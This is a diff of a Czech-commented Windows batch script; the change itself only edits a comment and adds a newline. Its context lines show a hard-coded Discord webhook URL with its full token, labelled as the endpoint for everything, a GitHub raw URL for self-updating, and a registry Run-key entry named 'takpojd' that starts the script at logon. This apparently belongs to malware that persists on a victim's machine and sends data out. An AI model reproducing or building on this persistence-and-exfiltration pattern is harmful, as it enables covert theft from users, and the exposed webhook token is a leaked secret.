@@ -2,7 +2,7 @@
 chcp 65001 >nul
 setlocal EnableDelayedExpansion
 
-:: 🌐 Webhook pro vše
+:: 🌐 Webhook pro vše test
 set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N_ZDkZQ1TRUiAgqiaqhPpkgcN6KIiFO1m5PWw6aDAm0cFOE445el1c8"
 
 :: 🔁 GitHub RAW URL pro aktualizaci
@@ -105,3 +105,4 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "takpojd" /t REG
 
 :: ✅ Hotovo
 exit
+
